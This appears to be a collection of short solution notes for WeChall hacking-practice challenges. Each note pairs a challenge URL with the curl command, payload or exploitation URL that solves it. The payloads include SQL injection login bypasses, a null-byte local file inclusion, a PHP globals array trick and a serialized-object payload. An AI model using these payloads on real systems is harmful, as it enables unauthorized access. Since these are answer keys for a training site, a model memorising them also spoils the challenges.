
### http://www.wechall.net/challenge/training/get_sourced/index.php

    $ curl -s http://www.wechall.net/challenge/training/get_sourced/index.php | grep password 

### http://www.wechall.net/challenge/training/encodings/ascii/index.php

    $ for dec in $(echo "84, 104, 101, 32, 115, 111, 108, 117, 116, 105, 111, 110, 32, 105, 115, 58, 32, 109, 99, 110, 108, 102, 105, 114, 112, 98, 111, 99, 103" | tr -d ','); do printf "%x" $dec; done | xxd -r -p

### http://www.wechall.net/challenge/training/stegano1/index.php

    $ strings stegano1.bmp

### http://www.wechall.net/challenge/training/www/robots/index.php

```
$ curl -s http://www.wechall.net/robots.txt
$ curl -s http://www.wechall.net/challenge/training/www/robots/T0PS3CR3T/
```

### http://www.wechall.net/challenge/training/crypto/caesar/index.php

    http://www.xarg.org/tools/caesar-cipher/

### http://www.wechall.net/challenge/training/encodings1/index.php

    $  for i in $(cat encoding.txt | tr -d '\n' | sed 's/.\{7\}/&\n/g'); do echo "obase=16; ibase=2; ${i}" | bc | xxd -r -p; done

### http://www.wechall.net/challenge/training/mysql/auth_bypass1/index.php

    $ curl http://www.wechall.net/challenge/training/mysql/auth_bypass1/index.php -d "username=admin'#&password=aaa&login=Login"

### http://www.wechall.net/challenge/training/php/lfi/up/index.php

    $ http://www.wechall.net/challenge/training/php/lfi/up/index.php?file=../../solution.php%00

### http://www.wechall.net/challenge/no_escape/index.php

    # payload:
    barack`=111#

    # exploitation URL:
    https://www.wechall.net/challenge/no_escape/index.php?vote_for=barack`=111%23

### https://www.wechall.net/challenge/php0817/index.php

```
# exploitation URL:
https://www.wechall.net/challenge/php0817/index.php?which=solution
```

### http://www.wechall.net/challenge/training/php/globals

```
# exploitation URL:
http://www.wechall.net/challenge/training/php/globals/globals.php?login[]=admin
```

### http://www.wechall.net/challenge/are_you_serial/index.php

```
$ cat > s.php <<EOF
<?php
class SERIAL_Solution
{
}
$s = new SERIAL_Solution();

echo urlencode(serialize($s));
?>
EOF

$ php -f s.php

serial_user=O%3A15%3A%22SERIAL_Solution%22%3A0%3A%7B%7D
```

### https://www.wechall.net/challenge/noother/php0818/index.php

```
# solution: hexadecimal representation of given maigc number (3735929054): 0xDEADC0DE
```
